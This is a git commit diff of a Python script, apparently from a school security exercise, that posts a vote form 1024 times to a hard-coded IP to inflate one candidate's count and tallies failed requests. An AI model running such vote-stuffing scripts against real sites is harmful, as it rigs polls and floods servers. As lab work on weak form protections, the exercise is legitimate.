5f76febd6dc74f7ea8771b82325b56daeb181feb
Andrés Cataño <3866@holbertonschool.com>
2022-02-06 11:35:15 -0500

    Level 0 Voting 1024 Any OS

--- level_0/task0.py
+++ level_0/task0.py
@@ -5,10 +5,15 @@ import requests
 
 url = "http://158.69.76.135/level0.php"
 form = {
-        "id": "3866",
+        "id": "80",
         "holdthedoor": "Submit"
         }
+crash = 0
 
 if __name__ == "__main__":
     for i in range(0, 1024):
-        requests.post(url, data=form)
+        result = requests.post(url, data=form)
+        if result.status_code != 200:
+            print("Failed to post {} the request".format(i))
+            crash += 1
+    print("Failed {} number or requests".format(crash))
